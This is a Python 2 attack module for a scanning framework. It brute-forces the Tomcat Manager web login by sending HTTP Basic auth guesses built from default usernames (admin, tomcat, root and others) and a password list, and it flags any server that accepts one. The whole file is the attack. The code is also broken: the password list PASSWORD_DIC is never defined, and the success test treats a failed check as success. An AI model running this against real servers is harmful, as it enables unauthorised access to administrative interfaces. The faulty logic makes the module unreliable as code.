#!/usr/bin/env python
# coding:utf-8
"""
  Author:  Conan0xff
  Purpose: tomcat manager crack pass
  Created: 09/29/17
"""

import urllib
import urllib2
import random
import string
import urlparse
import re
import base64

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param

NAME = 'tomcat_crack'

AUTHOR = 'Conan0xff'

DESCRIPTION = 'tomcat crack pass poc'

RESULT_DESC = '''return host and result if is vulnerable'''

DEMANDS = [TargetDemand('target', target.TYPE_URL)]

def check(ip, port, timeout):
    error_i = 0
    flag_list = ['/manager/html/reload', 'Tomcat Web Application Manager']
    user_list = ['admin', 'manager', 'tomcat', 'apache', 'root']
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            try:
                pass_ = str(pass_.replace('{user}', user))
                login_url = 'http://' + ip + ":" + str(port) + '/manager/html'
                request = urllib2.Request(login_url)
                auth_str_temp = user + ':' + pass_
                auth_str = base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic ' + auth_str)
                res = urllib2.urlopen(request, timeout=timeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError, e:
                res_code = e.code
                res_html = e.read()
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3: return
                continue
            if int(res_code) == 404: return
            if int(res_code) == 401 or int(res_code) == 403: continue
            for flag in flag_list:
                if flag in res_html:
                    return u'Tomcat弱口令 %s:%s' % (user, pass_)

def exploit(target, payload, config):
    # parse url to host and port
    timeout = 5
    proto, rest = urllib.splittype(target)
    host, rest = urllib.splithost(rest)
    host, port = urllib.splitport(host)
    if port is None:
        port = 80
    port=int(port)
    if check(host, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit

if __name__ == '__main__':
    print exploit('http://127.0.0.1:8080','','{}')
